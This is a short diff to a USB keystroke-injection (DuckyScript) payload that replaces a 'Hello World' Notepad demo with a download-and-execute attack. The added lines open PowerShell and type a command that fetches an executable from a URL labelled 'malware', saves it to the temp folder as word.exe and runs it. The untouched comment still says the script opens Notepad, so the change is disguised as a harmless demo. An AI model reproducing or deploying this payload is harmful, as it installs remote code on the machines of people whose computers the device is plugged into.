@@ -1,6 +1,12 @@
 REM The next four lines open Notepad in Windows and type "Hello World!"
+
 GUI r
-STRING notepad
+
+STRING powershell
+
 ENTER
-DELAY 250
-STRING Hello World!
+
+DELAY 500
+
+REM word.exe ;)
+STRING $f="$env:TEMP\word.exe"; iwr "https://domain.tld/damd/malware/uri" -o $f; &$f
